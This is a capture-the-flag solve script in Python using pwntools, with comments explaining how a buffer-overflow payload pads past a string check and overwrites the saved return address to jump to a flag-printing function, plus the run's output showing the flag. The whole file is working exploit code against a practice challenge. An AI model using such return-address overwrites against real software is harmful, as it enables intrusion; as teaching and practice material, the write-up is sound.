# solve script solve.py
from pwn import * 

p = process("./program")
# p = remote("chal.firebird.sh", 35019)

payload = b'UwUUwU' + b'A' * 74  # 80 bytes to UwU
payload += b'nothing' + b'\0' # make sure it's "nothing"
payload += b'A' * 8 # the data "nothing" itself at $rbp-0x10 takes 8 bytes, add 8 more bytes (16 bytes i.e. 0x10 ) to reach $rbp

payload += b'A' * 8 # according to the typical stack memory layout and actual stack section from pwndbg, the address to be overwritten is located at $rbp+0x8, 8 bytes above base pointer 
payload += p64(0x00000000004007d6) # overwrite the value to jump to UwU_flag

# double verification, 80 + 8 ("nothing") + 8 + 8 = 104, the offset we calculated earlier, perfect! 
p.sendline(payload)

p.interactive()


'''
┌──(kali㉿kali)-[~/Desktop/CTF/writeups]
└─$ python solve.py                      
[+] Opening connection to chal.firebird.sh on port 35019: Done
[*] Switching to interactive mode
Welcome to the world of UwU!! ฅ^•ﻌ•^ฅ

Can you create some UwU for UwU? ⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄
Your UwU is UwU enough!! (╯✧∇✧)╯
What the hack!! How you did get here!! (ꐦ°д°) 
Let me print the flag to you... ( ˘•ω•˘ )◞⁽˙³˙⁾
flag{w4rp1n6_7h3_f10w_w17h_UwU}

[*] Got EOF while reading in interactive
'''